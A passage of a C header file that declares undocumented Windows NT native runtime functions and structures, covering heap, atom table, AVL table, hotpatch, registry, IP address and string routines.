    DWORD MemberLevel;  // Level of this job in the set. Must be > 0. Can be sparse.
    DWORD Flags;        // Unused. Must be zero
} JOB_SET_ARRAY, *PJOB_SET_ARRAY;
#endif

VOID
NTAPI
RtlInitializeHandleTable(
	IN ULONG MaximumNumberOfHandles,
	IN ULONG SizeOfHandleTableEntry,
	OUT PRTL_HANDLE_TABLE HandleTable
	);

NTSTATUS
NTAPI
RtlDestroyHandleTable(
	IN OUT PRTL_HANDLE_TABLE HandleTable
	);

PRTL_HANDLE_TABLE_ENTRY
NTAPI
RtlAllocateHandle(
	IN PRTL_HANDLE_TABLE HandleTable,
	OUT OPTIONAL PULONG HandleIndex
	);

BOOLEAN
NTAPI
RtlFreeHandle(
	IN PRTL_HANDLE_TABLE HandleTable,
	IN PRTL_HANDLE_TABLE_ENTRY Handle
	);

BOOLEAN
NTAPI
RtlIsValidHandle(
	IN PRTL_HANDLE_TABLE HandleTable,
	IN PRTL_HANDLE_TABLE_ENTRY Handle
	);

BOOLEAN
NTAPI
RtlIsValidIndexHandle(
	IN PRTL_HANDLE_TABLE HandleTable,
	IN ULONG HandleIndex,
	OUT PRTL_HANDLE_TABLE_ENTRY *Handle
	);

#define RTL_ATOM_MAXIMUM_INTEGER_ATOM (RTL_ATOM)0xc000
#define RTL_ATOM_INVALID_ATOM (RTL_ATOM)0x0000
#define RTL_ATOM_TABLE_DEFAULT_NUMBER_OF_BUCKETS 37
#define RTL_ATOM_MAXIMUM_NAME_LENGTH 255
#define RTL_ATOM_PINNED 0x01

NTSTATUS
NTAPI
RtlCreateAtomTable(
	IN ULONG NumberOfBuckets,
	OUT PVOID *AtomTableHandle
	);

NTSTATUS
NTAPI
RtlDestroyAtomTable(
	IN PVOID AtomTableHandle
	);

NTSTATUS
NTAPI
RtlEmptyAtomTable(
	IN PVOID AtomTableHandle,
	IN BOOLEAN IncludePinnedAtoms
	);

NTSTATUS
NTAPI
RtlAddAtomToAtomTable(
	IN PVOID AtomTableHandle,
	IN PWSTR AtomName,
	IN OUT OPTIONAL PRTL_ATOM Atom
	);

NTSTATUS
NTAPI
RtlLookupAtomInAtomTable(
	IN PVOID AtomTableHandle,
	IN PWSTR AtomName,
	OUT OPTIONAL PRTL_ATOM Atom
	);

NTSTATUS
NTAPI
RtlDeleteAtomFromAtomTable(
	IN PVOID AtomTableHandle,
	IN RTL_ATOM Atom
	);

NTSTATUS
NTAPI
RtlPinAtomInAtomTable(
	IN PVOID AtomTableHandle,
	IN RTL_ATOM Atom
	);

NTSTATUS
NTAPI
RtlQueryAtomInAtomTable(
	IN PVOID AtomTableHandle,
	IN RTL_ATOM Atom,
	OUT OPTIONAL PULONG AtomUsage,
	OUT OPTIONAL PULONG AtomFlags,
	IN OUT PWSTR AtomName,
	IN OUT OPTIONAL PULONG AtomNameLength
	);

NTSTATUS
NTAPI
RtlQueryAtomsInAtomTable(
	IN PVOID AtomTableHandle,
	IN ULONG MaximumNumberOfAtoms,
	OUT PULONG NumberOfAtoms,
	OUT PRTL_ATOM Atoms
	);

BOOLEAN
NTAPI
RtlGetIntegerAtom(
	IN PWSTR AtomName,
	OUT OPTIONAL PUSHORT IntegerAtom
	);

#define EVENT_MIN_LEVEL                      (0)
#define EVENT_MAX_LEVEL                      (0xff)

#define EVENT_ACTIVITY_CTRL_GET_ID           (1)
#define EVENT_ACTIVITY_CTRL_SET_ID           (2)
#define EVENT_ACTIVITY_CTRL_CREATE_ID        (3)
#define EVENT_ACTIVITY_CTRL_GET_SET_ID       (4)
#define EVENT_ACTIVITY_CTRL_CREATE_SET_ID    (5)

	typedef ULONGLONG REGHANDLE, *PREGHANDLE;

#define MAX_EVENT_DATA_DESCRIPTORS           (128)
#define MAX_EVENT_FILTER_DATA_SIZE           (1024)

	//
	// EVENT_DATA_DESCRIPTOR is used to pass in user data items
	// in events.
	// 

	typedef struct _EVENT_DATA_DESCRIPTOR
	{
		ULONG_PTR   Ptr;        // Pointer to data
		ULONG       Size;       // Size of data in bytes
		ULONG       Reserved;
	} EVENT_DATA_DESCRIPTOR, *PEVENT_DATA_DESCRIPTOR;

	typedef struct _EVENT_DESCRIPTOR
	{
		USHORT      Id;
		UCHAR       Version;
		UCHAR       Channel;
		UCHAR       Level;
		UCHAR       Opcode;
		USHORT      Task;
		ULONGLONG   Keyword;
	} EVENT_DESCRIPTOR, *PEVENT_DESCRIPTOR;
	typedef const EVENT_DESCRIPTOR *PCEVENT_DESCRIPTOR;

	//
	// EVENT_FILTER_DESCRIPTOR is used to pass in enable filter
	// data item to a user callback function.
	// 
	typedef struct _EVENT_FILTER_DESCRIPTOR
	{
		ULONG_PTR   Ptr;
		ULONG       Size;
		ULONG       Type;
	} EVENT_FILTER_DESCRIPTOR, *PEVENT_FILTER_DESCRIPTOR;

//
// old nt4 channel stuff
//
//#pragma pack(1)
#pragma pack()
typedef struct _CHANNEL_MESSAGE
{
	PVOID Text;
	ULONG Length;
	PVOID Context;
	PVOID Base;
	union
	{
		BOOLEAN Close;
		LONGLONG Align;
	};
} CHANNEL_MESSAGE, *PCHANNEL_MESSAGE;

typedef struct _HOTPATCH_HEADER
{
	ULONG Signature;
	ULONG Version;
	ULONG FixupRgnCount;
	ULONG FixupRgnRva;
	ULONG ValidationCount;
	ULONG ValidationArrayRva;
	ULONG HookCount;
	ULONG HookArrayRva;
	ULONG_PTR OrigHotpBaseAddress;
	ULONG_PTR OrigTargetBaseAddress;
	ULONG TargetNameRva;
	ULONG ModuleIdMethod;
	union { 
		ULONG Filler;
	} TargetModuleIdValue;
} HOTPATCH_HEADER, *PHOTPATCH_HEADER;

typedef struct _HOTPATCH_MODULE_DATA
{
	USHORT HotpatchImageNameLength;
	USHORT ColdpatchImagePathLength;
	WCHAR NameBuffer[ 1 ];
} HOTPATCH_MODULE_DATA, *PHOTPATCH_MODULE_DATA;

typedef struct _HOTPATCH_MODULE_ENTRY
{
	struct _TRIPLE_LIST_ENTRY ListEntry;
	struct _HOTPATCH_MODULE_DATA Data;
} HOTPATCH_MODULE_ENTRY, *PHOTPATCH_MODULE_ENTRY;

typedef struct _HOTPATCH_HOOK
{
	USHORT HookType;
	USHORT HookOptions;
	ULONG HookRva;
	ULONG HotpRva;
	ULONG ValidationRva;
} HOTPATCH_HOOK, *PHOTPATCH_HOOK;

typedef struct _RTL_PATCH_HEADER
{
	LIST_ENTRY PatchList;
	PVOID PatchImageBase;
	struct _RTL_PATCH_HEADER* NextPatch;
	ULONG PatchFlags;
	LONG PatchRefCount;
	struct _HOTPATCH_HEADER* HotpatchHeader;
	UNICODE_STRING TargetDllName;
	HANDLE TargetDllBase;
	PLDR_DATA_TABLE_ENTRY TargetLdrDataTableEntry;
	PLDR_DATA_TABLE_ENTRY PatchLdrDataTableEntry;
	PSYSTEM_HOTPATCH_CODE_INFORMATION CodeInfo;
	PVOID ColdpatchFileHandle;
	HOTPATCH_MODULE_ENTRY HotpatchModuleEntry;
} RTL_PATCH_HEADER, *PRTL_PATCH_HEADER;



#pragma warning(default: 4273) // nconsistent dll linkage (winnt.h)

#ifndef _SLIST_HEADER_
#define _SLIST_HEADER_

#if defined(_M_X64)

//
// The type SINGLE_LIST_ENTRY is not suitable for use with SLISTs.  For
// WIN64, an entry on an SLIST is required to be 16-byte aligned, while a
// SINGLE_LIST_ENTRY structure has only 8 byte alignment.
//
// Therefore, all SLIST code should use the SLIST_ENTRY type instead of the
// SINGLE_LIST_ENTRY type.
//

#pragma warning(push)
#pragma warning(disable:4324)   // structure padded due to align()
typedef struct DECLSPEC_ALIGN(16) _SLIST_ENTRY *PSLIST_ENTRY;
typedef struct DECLSPEC_ALIGN(16) _SLIST_ENTRY {
    PSLIST_ENTRY Next;
} SLIST_ENTRY;
#pragma warning(pop)

#else

#define SLIST_ENTRY SINGLE_LIST_ENTRY
#define _SLIST_ENTRY _SINGLE_LIST_ENTRY
#define PSLIST_ENTRY PSINGLE_LIST_ENTRY

#endif

#if defined(_M_X64)

typedef struct DECLSPEC_ALIGN(16) _SLIST_HEADER {
    ULONGLONG Alignment;
    ULONGLONG Region;
} SLIST_HEADER;

typedef struct _SLIST_HEADER *PSLIST_HEADER;

#else

typedef union _SLIST_HEADER {
    ULONGLONG Alignment;
    struct {
        SLIST_ENTRY Next;
        WORD   Depth;
        WORD   Sequence;
    };
} SLIST_HEADER, *PSLIST_HEADER;

#endif

#endif

//
// prototypes *must* be encapsulated with extern "C" macros at start and end of prototype block
//

PSLIST_ENTRY
__fastcall
RtlInterlockedPushListSList (
     IN PSLIST_HEADER ListHead,
     IN PSLIST_ENTRY List,
     IN PSLIST_ENTRY ListEnd,
     IN ULONG Count
     );

VOID
NTAPI
RtlAssert(
	IN PVOID VoidFailedAssertion,
	IN PVOID VoidFileName,
	IN ULONG LineNumber,
	IN OPTIONAL PSTR MutableMessage
    );

VOID
NTAPI
RtlInitializeGenericTableAvl (
    PRTL_AVL_TABLE Table,
    PRTL_AVL_COMPARE_ROUTINE CompareRoutine,
    PRTL_AVL_ALLOCATE_ROUTINE AllocateRoutine,
    PRTL_AVL_FREE_ROUTINE FreeRoutine,
    PVOID TableContext
    );

PVOID
NTAPI
RtlInsertElementGenericTableAvl (
    PRTL_AVL_TABLE Table,
    PVOID Buffer,
    ULONG BufferSize,
    PBOOLEAN NewElement OPTIONAL
    );

PVOID
NTAPI
RtlInsertElementGenericTableFullAvl (
    PRTL_AVL_TABLE Table,
    PVOID Buffer,
    ULONG BufferSize,
    PBOOLEAN NewElement OPTIONAL,
    PVOID NodeOrParent,
    TABLE_SEARCH_RESULT SearchResult
    );

BOOLEAN
NTAPI
RtlDeleteElementGenericTableAvl (
    PRTL_AVL_TABLE Table,
    PVOID Buffer
    );

PVOID
NTAPI
RtlLookupElementGenericTableAvl (
    PRTL_AVL_TABLE Table,
    PVOID Buffer
    );

PVOID
NTAPI
RtlLookupElementGenericTableFullAvl (
    PRTL_AVL_TABLE Table,
    PVOID Buffer,
    OUT PVOID *NodeOrParent,
    OUT TABLE_SEARCH_RESULT *SearchResult
    );

PVOID
NTAPI
RtlEnumerateGenericTableAvl (
    PRTL_AVL_TABLE Table,
    BOOLEAN Restart
    );

PVOID
NTAPI
RtlEnumerateGenericTableWithoutSplayingAvl (
    PRTL_AVL_TABLE Table,
    PVOID *RestartKey
    );

PVOID
NTAPI
RtlEnumerateGenericTableLikeADirectory (
    IN PRTL_AVL_TABLE Table,
    IN PRTL_AVL_MATCH_FUNCTION MatchFunction,
    IN PVOID MatchData,
    IN ULONG NextFlag,
    IN OUT PVOID *RestartKey,
    IN OUT PULONG DeleteCount,
    IN OUT PVOID Buffer
    );

PVOID
NTAPI
RtlGetElementGenericTableAvl (
    PRTL_AVL_TABLE Table,
    ULONG I
    );

ULONG
NTAPI
RtlNumberGenericTableElementsAvl (
    PRTL_AVL_TABLE Table
    );

BOOLEAN
NTAPI
RtlIsGenericTableEmptyAvl (
    PRTL_AVL_TABLE Table
    );

PRTL_SPLAY_LINKS
NTAPI
RtlSplay (
    PRTL_SPLAY_LINKS Links
    );

PRTL_SPLAY_LINKS
NTAPI
RtlDelete (
    PRTL_SPLAY_LINKS Links
    );

VOID
NTAPI
RtlDeleteNoSplay (
    PRTL_SPLAY_LINKS Links,
    PRTL_SPLAY_LINKS *Root
    );

PRTL_SPLAY_LINKS
NTAPI
RtlSubtreeSuccessor (
    PRTL_SPLAY_LINKS Links
    );

PRTL_SPLAY_LINKS
NTAPI
RtlSubtreePredecessor (
    PRTL_SPLAY_LINKS Links
    );

PRTL_SPLAY_LINKS
NTAPI
RtlRealSuccessor (
    PRTL_SPLAY_LINKS Links
    );

PRTL_SPLAY_LINKS
NTAPI
RtlRealPredecessor (
    PRTL_SPLAY_LINKS Links
    );

VOID
NTAPI
RtlInitializeGenericTable (
    PRTL_GENERIC_TABLE Table,
    PRTL_GENERIC_COMPARE_ROUTINE CompareRoutine,
    PRTL_GENERIC_ALLOCATE_ROUTINE AllocateRoutine,
    PRTL_GENERIC_FREE_ROUTINE FreeRoutine,
    PVOID TableContext
    );

PVOID
NTAPI
RtlInsertElementGenericTable (
    PRTL_GENERIC_TABLE Table,
    PVOID Buffer,
    ULONG BufferSize,
    PBOOLEAN NewElement OPTIONAL
    );

PVOID
NTAPI
RtlInsertElementGenericTableFull (
    PRTL_GENERIC_TABLE Table,
    PVOID Buffer,
    ULONG BufferSize,
    PBOOLEAN NewElement OPTIONAL,
    PVOID NodeOrParent,
    TABLE_SEARCH_RESULT SearchResult
    );

BOOLEAN
NTAPI
RtlDeleteElementGenericTable (
    PRTL_GENERIC_TABLE Table,
    PVOID Buffer
    );

PVOID
NTAPI
RtlLookupElementGenericTable (
    PRTL_GENERIC_TABLE Table,
    PVOID Buffer
    );

PVOID
NTAPI
RtlLookupElementGenericTableFull (
    PRTL_GENERIC_TABLE Table,
    PVOID Buffer,
    OUT PVOID *NodeOrParent,
    OUT TABLE_SEARCH_RESULT *SearchResult
    );

PVOID
NTAPI
RtlEnumerateGenericTable (
    PRTL_GENERIC_TABLE Table,
    BOOLEAN Restart
    );

PVOID
NTAPI
RtlEnumerateGenericTableWithoutSplaying (
    PRTL_GENERIC_TABLE Table,
    PVOID *RestartKey
    );

PVOID
NTAPI
RtlGetElementGenericTable(
    PRTL_GENERIC_TABLE Table,
    ULONG I
    );

ULONG
NTAPI
RtlNumberGenericTableElements(
    PRTL_GENERIC_TABLE Table
    );

BOOLEAN
NTAPI
RtlIsGenericTableEmpty (
    PRTL_GENERIC_TABLE Table
    );

NTSTATUS
NTAPI
RtlInitializeHeapManager(
    );

PVOID
NTAPI
RtlCreateHeap(
	IN ULONG Flags,
	IN PVOID HeapBase OPTIONAL,
	IN SIZE_T ReserveSize OPTIONAL,
	IN SIZE_T CommitSize OPTIONAL,
	IN PVOID Lock OPTIONAL,
	IN PRTL_HEAP_PARAMETERS Parameters OPTIONAL
	);

PVOID
NTAPI
RtlDestroyHeap(
    IN PVOID HeapHandle
    );

PVOID
NTAPI
RtlAllocateHeap(
    IN PVOID HeapHandle,
    IN ULONG Flags,
    IN SIZE_T Size
    );

BOOLEAN
NTAPI
RtlFreeHeap(
	IN PVOID HeapHandle,
	IN OPTIONAL ULONG Flags,
	IN PVOID BaseAddress
	);

SIZE_T
NTAPI
RtlSizeHeap(
    IN PVOID HeapHandle,
    IN ULONG Flags,
    IN PVOID BaseAddress
    );

NTSTATUS
NTAPI
RtlZeroHeap(
    IN PVOID HeapHandle,
    IN ULONG Flags
    );

VOID
NTAPI
RtlProtectHeap(
    IN PVOID HeapHandle,
    IN BOOLEAN MakeReadOnly
    );

ULONG
NTAPI
RtlGetNtGlobalFlags(
    VOID
    );

VOID
NTAPI
RtlGetCallersAddress(
    OUT PVOID *CallersAddress,
    OUT PVOID *CallersCaller
    );

ULONG
NTAPI
RtlWalkFrameChain (
    OUT PVOID *Callers,
    IN ULONG Count,
    IN ULONG Flags
    );

USHORT
NTAPI
RtlLogStackBackTrace(
    VOID
    );


ULONG
NTAPI
RtlCaptureStackContext (
    OUT PULONG_PTR Callers,
    OUT PRTL_STACK_CONTEXT Context,
    IN ULONG Limit
    );

BOOLEAN
NTAPI
RtlGetNtProductType(
	PNT_PRODUCT_TYPE NtProductType
	);

NTSTATUS
NTAPI
RtlFormatCurrentUserKeyPath (
    OUT PUNICODE_STRING CurrentUserKeyPath
    );

NTSTATUS
NTAPI
RtlOpenCurrentUser(
    IN ULONG DesiredAccess,
    OUT PHANDLE CurrentUserKey
    );

NTSTATUS
NTAPI
RtlQueryRegistryValues(
    IN ULONG RelativeTo,
    IN PCWSTR Path,
    IN PRTL_QUERY_REGISTRY_TABLE QueryTable,
    IN PVOID Context,
    IN PVOID Environment OPTIONAL
    );

NTSTATUS
NTAPI
RtlWriteRegistryValue(
    IN ULONG RelativeTo,
    IN PCWSTR Path,
    IN PCWSTR ValueName,
    IN ULONG ValueType,
    IN PVOID ValueData,
    IN ULONG ValueLength
    );

NTSTATUS
NTAPI
RtlDeleteRegistryValue(
    IN ULONG RelativeTo,
    IN PCWSTR Path,
    IN PCWSTR ValueName
    );

NTSTATUS
NTAPI
RtlCreateRegistryKey(
	IN ULONG RelativeTo,
	IN PWSTR Path
    );

NTSTATUS
NTAPI
RtlCheckRegistryKey(
	IN ULONG RelativeTo,
	IN PWSTR Path
    );

//added 21/03/2011
//begin
BOOLEAN
NTAPI
RtlLockHeap(
	IN PVOID HeapHandle
	);


BOOLEAN
NTAPI
RtlUnlockHeap(
	IN PVOID HeapHandle
	);


PVOID
NTAPI
RtlReAllocateHeap(
    IN PVOID HeapHandle,
    IN ULONG Flags,
    IN PVOID BaseAddress,
    IN SIZE_T Size
    );


BOOLEAN
NTAPI
RtlGetUserInfoHeap(
	IN PVOID HeapHandle,
	IN ULONG Flags,
	IN PVOID BaseAddress,
	OUT OPTIONAL PVOID *UserValue,
	OUT OPTIONAL PULONG UserFlags
    );


BOOLEAN
NTAPI
RtlSetUserValueHeap(
    IN PVOID HeapHandle,
    IN ULONG Flags,
    IN PVOID BaseAddress,
    IN PVOID UserValue
    );


BOOLEAN
NTAPI
RtlSetUserFlagsHeap(
	IN PVOID HeapHandle,
	IN ULONG Flags,
	IN PVOID BaseAddress,
	IN ULONG UserFlagsReset,
	IN ULONG UserFlagsSet
	);


ULONG
NTAPI
RtlCreateTagHeap(
    IN PVOID HeapHandle,
    IN ULONG Flags,
    IN OPTIONAL PWSTR TagPrefix,
    IN PWSTR TagNames
    );


PWSTR
NTAPI
RtlQueryTagHeap(
    IN PVOID HeapHandle,
    IN ULONG Flags,
    IN USHORT TagIndex,
    IN BOOLEAN ResetCounters,
    OUT OPTIONAL PRTL_HEAP_TAG_INFO TagInfo
    );


NTSTATUS
NTAPI
RtlExtendHeap(
    IN PVOID HeapHandle,
    IN ULONG Flags,
    IN PVOID Base,
    IN SIZE_T Size
    );


SIZE_T
NTAPI
RtlCompactHeap(
    IN PVOID HeapHandle,
    IN ULONG Flags
    );


BOOLEAN
NTAPI
RtlValidateProcessHeaps(
    );

ULONG
NTAPI
RtlGetProcessHeaps(
    IN ULONG NumberOfHeaps,
    OUT PVOID *ProcessHeaps
    );


NTSTATUS
NTAPI
RtlUsageHeap(
	IN PVOID HeapHandle,
	IN ULONG Flags,
	IN OUT PRTL_HEAP_USAGE Usage
	);


NTSTATUS
NTAPI
RtlWalkHeap(
	IN PVOID HeapHandle,
	IN OUT PRTL_HEAP_WALK_ENTRY Entry
	);

#if !defined(_WINDOWS_)
NTSTATUS
NTAPI
RtlQueryHeapInformation(
	IN PVOID HeapHandle,
	IN HEAP_INFORMATION_CLASS HeapInformationClass,
	OUT OPTIONAL PVOID HeapInformation,
	IN OPTIONAL SIZE_T HeapInformationLength,
	OUT OPTIONAL PSIZE_T ReturnLength
	);

NTSTATUS
NTAPI
RtlSetHeapInformation(
	IN PVOID HeapHandle,
	IN HEAP_INFORMATION_CLASS HeapInformationClass,
	IN OPTIONAL PVOID HeapInformation,
	IN OPTIONAL SIZE_T HeapInformationLength
	);
#endif

ULONG
NTAPI
RtlMultipleAllocateHeap(
	IN PVOID HeapHandle,
	IN ULONG Flags,
	IN SIZE_T Size,
	IN ULONG Count,
	OUT PVOID *Array
	);

ULONG
NTAPI
RtlMultipleFreeHeap(
	IN PVOID HeapHandle,
	IN ULONG Flags,
	IN ULONG Count,
	IN PVOID *Array
	);

VOID
NTAPI
RtlDetectHeapLeaks(
	VOID
	);


#if (NTDDI_VERSION >= NTDDI_VISTA)
NTSTATUS
NTAPI
RtlCreateMemoryZone(
	OUT PVOID *MemoryZone,
	IN SIZE_T InitialSize,
	ULONG Flags
	);

NTSTATUS
NTAPI
RtlDestroyMemoryZone(
	IN PVOID MemoryZone
	);

NTSTATUS
NTAPI
RtlAllocateMemoryZone(
	IN PVOID MemoryZone,
	IN SIZE_T BlockSize,
	OUT PVOID *Block
	);

NTSTATUS
NTAPI
RtlResetMemoryZone(
	IN PVOID MemoryZone
	);

NTSTATUS
NTAPI
RtlLockMemoryZone(
	IN PVOID MemoryZone
	);

NTSTATUS
NTAPI
RtlUnlockMemoryZone(
	IN PVOID MemoryZone
	);
#endif


#if (NTDDI_VERSION >= NTDDI_VISTA)
NTSTATUS
NTAPI
RtlCreateMemoryBlockLookaside(
	OUT PVOID *MemoryBlockLookaside,
	IN ULONG Flags,
	IN ULONG InitialSize,
	IN ULONG MinimumBlockSize,
	IN ULONG MaximumBlockSize
	);

NTSTATUS
NTAPI
RtlDestroyMemoryBlockLookaside(
	IN PVOID MemoryBlockLookaside
	);

NTSTATUS
NTAPI
RtlAllocateMemoryBlockLookaside(
	IN PVOID MemoryBlockLookaside,
	IN ULONG BlockSize,
	OUT PVOID *Block
	);

NTSYSAPI
NTSTATUS
NTAPI
RtlFreeMemoryBlockLookaside(
	IN PVOID MemoryBlockLookaside,
	IN PVOID Block
	);

NTSTATUS
NTAPI
RtlExtendMemoryBlockLookaside(
	IN PVOID MemoryBlockLookaside,
	IN ULONG Increment
	);

NTSTATUS
NTAPI
RtlResetMemoryBlockLookaside(
	IN PVOID MemoryBlockLookaside
	);

NTSTATUS
NTAPI
RtlLockMemoryBlockLookaside(
	IN PVOID MemoryBlockLookaside
	);

NTSTATUS
NTAPI
RtlUnlockMemoryBlockLookaside(
	IN PVOID MemoryBlockLookaside
	);
#endif

HANDLE
NTAPI
RtlGetCurrentTransaction(
	);

LOGICAL
NTAPI
RtlSetCurrentTransaction(
	IN HANDLE TransactionHandle
	);

PRTL_DEBUG_INFORMATION
NTAPI
RtlCreateQueryDebugBuffer(
	IN OPTIONAL ULONG MaximumCommit,
	IN BOOLEAN UseEventPair
	);

NTSTATUS
NTAPI
RtlDestroyQueryDebugBuffer(
	IN PRTL_DEBUG_INFORMATION Buffer
	);

NTSTATUS
NTAPI
RtlQueryProcessDebugInformation(
	IN HANDLE UniqueProcessId,
	IN ULONG Flags,
	IN OUT PRTL_DEBUG_INFORMATION Buffer
	);


//added 21/03/2011
//end

ULONG
NTAPI
RtlUniform (
	PULONG Seed
    );

NTSTATUS
RtlComputeImportTableHash(
	IN HANDLE hFile,
	OUT PCHAR Hash,
	IN ULONG ImportTableHashRevision
    );

NTSTATUS
NTAPI
RtlIntegerToChar (
    ULONG Value,
    ULONG Base,
    LONG OutputLength,
    PSZ String
    );

NTSTATUS
NTAPI
RtlIntegerToUnicode (
    IN ULONG Value,
    IN ULONG Base OPTIONAL,
    IN LONG OutputLength,
    OUT PWSTR String
    );

NTSTATUS
NTAPI
RtlLargeIntegerToChar (
    PLARGE_INTEGER Value,
    ULONG Base OPTIONAL,
    LONG OutputLength,
    PSZ String
    );

NTSTATUS
NTAPI
RtlLargeIntegerToUnicode (
    IN PLARGE_INTEGER Value,
    IN ULONG Base OPTIONAL,
    IN LONG OutputLength,
    OUT PWSTR String
    );

PSTR
NTAPI
RtlIpv4AddressToStringA (
	IN const struct in_addr *Addr,
	OUT PSTR S
	);

PSTR
NTAPI
RtlIpv6AddressToStringA (
	IN const struct in6_addr *Addr,
	OUT PSTR S
	);

NTSTATUS
NTAPI
RtlIpv4AddressToStringExA(
    IN const struct in_addr *Address,
    IN USHORT Port,
    OUT PSTR AddressString,
    IN OUT PULONG AddressStringLength
    );

NTSTATUS
NTAPI
RtlIpv6AddressToStringExA(
    IN const struct in6_addr *Address,
    IN ULONG ScopeId,
    IN USHORT Port,
    OUT PSTR AddressString,
    IN OUT PULONG AddressStringLength
    );

PWSTR
NTAPI
RtlIpv4AddressToStringW (
    IN const struct in_addr *Addr,
    OUT PWSTR S
    );

PWSTR
NTAPI
RtlIpv6AddressToStringW (
    IN const struct in6_addr *Addr,
    OUT PWSTR S
    );

NTSTATUS
NTAPI
RtlIpv4AddressToStringExW(
    IN const struct in_addr *Address,
    IN USHORT Port,
    OUT PWSTR AddressString,
    IN OUT PULONG AddressStringLength
    );

NTSTATUS
NTAPI
RtlIpv6AddressToStringExW(
    IN const struct in6_addr *Address,
    IN ULONG ScopeId,
    IN USHORT Port,
    OUT PWSTR AddressString,
    IN OUT PULONG AddressStringLength
    );

NTSTATUS
NTAPI
RtlIpv4StringToAddressA (
    IN PCSTR S,
    IN BOOLEAN Strict,
    OUT PCSTR *Terminator,
    OUT struct in_addr *Addr
    );

NTSTATUS
NTAPI
RtlIpv6StringToAddressA (
    IN PCSTR S,
    OUT PCSTR *Terminator,
    OUT struct in6_addr *Addr
    );

NTSTATUS
NTAPI
RtlIpv4StringToAddressExA (
    IN PCSTR AddressString,
    IN BOOLEAN Strict,
    OUT struct in_addr *Address,
    OUT PUSHORT Port
    );

NTSTATUS
NTAPI
RtlIpv6StringToAddressExA (
    IN PCSTR AddressString,
    OUT struct in6_addr *Address,
    OUT PULONG ScopeId,
    OUT PUSHORT Port
    );

NTSTATUS
NTAPI
RtlIpv4StringToAddressW (
    IN PCWSTR S,
    IN BOOLEAN Strict,
    OUT LPCWSTR *Terminator,
    OUT struct in_addr *Addr
    );

NTSTATUS
NTAPI
RtlIpv6StringToAddressW (
    IN PCWSTR S,
    OUT PCWSTR *Terminator,
    OUT struct in6_addr *Addr
    );

NTSTATUS
NTAPI
RtlIpv4StringToAddressExW (
    IN PCWSTR AddressString,
    IN BOOLEAN Strict,
    OUT struct in_addr *Address,
    OUT PUSHORT Port
    );

NTSTATUS
NTAPI
RtlIpv6StringToAddressExW (
    IN PCWSTR AddressString,
    OUT struct in6_addr *Address,
    OUT PULONG ScopeId,
    OUT PUSHORT Port
    );

NTSTATUS
NTAPI
RtlIntegerToUnicodeString (
    ULONG Value,
    ULONG Base,
    PUNICODE_STRING String
    );

NTSTATUS
NTAPI
RtlInt64ToUnicodeString (
    IN ULONGLONG Value,
    IN ULONG Base OPTIONAL,
    IN OUT PUNICODE_STRING String
    );

NTSTATUS
NTAPI
RtlUnicodeStringToInteger (
    PCUNICODE_STRING String,
    ULONG Base,
    PULONG Value
    );

VOID
NTAPI
RtlInitString(
    PSTRING DestinationString,
    PCSZ SourceString
    );

VOID
NTAPI
RtlInitAnsiString(
    PANSI_STRING DestinationString,
    PCSZ SourceString
    );

NTSTATUS
NTAPI
RtlInitUnicodeString(
    PUNICODE_STRING DestinationString,
    PCWSTR SourceString
    );

NTSTATUS
NTAPI
RtlInitUnicodeStringEx(
    PUNICODE_STRING DestinationString,
    PCWSTR SourceString
    );

NTSTATUS
NTAPI
RtlInitAnsiStringEx(
    OUT PANSI_STRING DestinationString,
    IN PCSZ SourceString OPTIONAL
    );

BOOLEAN
NTAPI
RtlCreateUnicodeString(
    OUT PUNICODE_STRING DestinationString,
    IN PCWSTR SourceString
    );

BOOLEAN
NTAPI
RtlEqualDomainName(
    IN PCUNICODE_STRING String1,
    IN PCUNICODE_STRING String2
    );

BOOLEAN
NTAPI
RtlEqualComputerName(
    IN PCUNICODE_STRING String1,
    IN PCUNICODE_STRING String2
    );

NTSTATUS
RtlDnsHostNameToComputerName(
    OUT PUNICODE_STRING ComputerNameString,
    IN PCUNICODE_STRING DnsHostNameString,
    IN BOOLEAN AllocateComputerNameString
    );

BOOLEAN
NTAPI
RtlCreateUnicodeStringFromAsciiz(
    OUT PUNICODE_STRING DestinationString,
    IN PCSZ SourceString
    );

VOID
NTAPI
RtlCopyString(
    PSTRING DestinationString,
    const STRING * SourceString
    );

CHAR
NTAPI
RtlUpperChar (
    CHAR Character
    );

LONG
NTAPI
RtlCompareString(
    const STRING * String1,
    const STRING * String2,
    BOOLEAN CaseInSensitive
    );

BOOLEAN
NTAPI
RtlEqualString(
    const STRING * String1,
    const STRING * String2,
    BOOLEAN CaseInSensitive
    );

BOOLEAN
NTAPI
RtlPrefixString(
    const STRING * String1,
    const STRING * String2,
    BOOLEAN CaseInSensitive
    );

VOID
NTAPI
RtlUpperString(
    PSTRING DestinationString,
    const STRING * SourceString
    );

NTSTATUS
NTAPI
RtlAppendAsciizToString (
    PSTRING Destination,
    PCSZ Source
    );

NTSTATUS
NTAPI
RtlAppendStringToString (
    PSTRING Destination,
    const STRING * Source
    );

NTSTATUS
NTAPI
RtlAnsiStringToUnicodeString(
    PUNICODE_STRING DestinationString,
    PCANSI_STRING SourceString,
    BOOLEAN AllocateDestinationString
    );

WCHAR
NTAPI
RtlAnsiCharToUnicodeChar(
    PUCHAR *SourceCharacter
    );

NTSTATUS
NTAPI
RtlUnicodeStringToAnsiString(
    PANSI_STRING DestinationString,
    PCUNICODE_STRING SourceString,
    BOOLEAN AllocateDestinationString
    );

NTSTATUS
NTAPI
RtlUpcaseUnicodeStringToAnsiString(
    PANSI_STRING DestinationString,
    PCUNICODE_STRING SourceString,
    BOOLEAN AllocateDestinationString
    );

NTSTATUS
NTAPI
RtlOemStringToUnicodeString(
    PUNICODE_STRING DestinationString,
    PCOEM_STRING SourceString,
    BOOLEAN AllocateDestinationString
    );

NTSTATUS
NTAPI
RtlUnicodeStringToOemString(
    POEM_STRING DestinationString,
    PCUNICODE_STRING SourceString,
    BOOLEAN AllocateDestinationString
    );

NTSTATUS
NTAPI
RtlUpcaseUnicodeStringToOemString(
    POEM_STRING DestinationString,
    PCUNICODE_STRING SourceString,
    BOOLEAN AllocateDestinationString
    );

NTSTATUS
NTAPI
RtlOemStringToCountedUnicodeString(
    PUNICODE_STRING DestinationString,
    PCOEM_STRING SourceString,
    BOOLEAN AllocateDestinationString
    );

NTSTATUS
NTAPI
RtlUnicodeStringToCountedOemString(
    POEM_STRING DestinationString,
    PCUNICODE_STRING SourceString,
    BOOLEAN AllocateDestinationString
    );

NTSTATUS
NTAPI
RtlUpcaseUnicodeStringToCountedOemString(
    POEM_STRING DestinationString,
    PCUNICODE_STRING SourceString,
    BOOLEAN AllocateDestinationString
    );

LONG
NTAPI
RtlCompareUnicodeString(
    PCUNICODE_STRING String1,
